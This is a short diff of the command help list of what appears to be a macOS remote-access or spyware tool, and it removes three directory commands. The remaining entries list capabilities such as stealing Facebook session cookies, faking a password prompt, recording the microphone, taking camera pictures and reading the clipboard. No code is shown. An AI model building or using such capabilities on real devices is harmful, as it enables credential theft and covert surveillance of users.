@@ -1,4 +1,3 @@
-cd             : Change current directory.
 download       : Download remote file.
 getfacebook    : Retrieve facebook session cookies.
 getpaste       : Get pasteboard contents.
@@ -6,12 +5,10 @@ getvol         : Get speaker output volume.
 icons          : List system alert icons.
 idletime       : Get the amount of user activity time.
 imessage       : Send message through the messages app.
-ls             : List contents of a directory.
 mic            : Record mic sound.
 picture        : Take picture through iSight.
 pid            : Get MPL process ID.
 prompt         : Prompt user to type password.
-pwd            : Show current directory.
 screenshot     : Take screenshot.
 setbright      : Set screen brightness.
 setvol         : Set output volume.
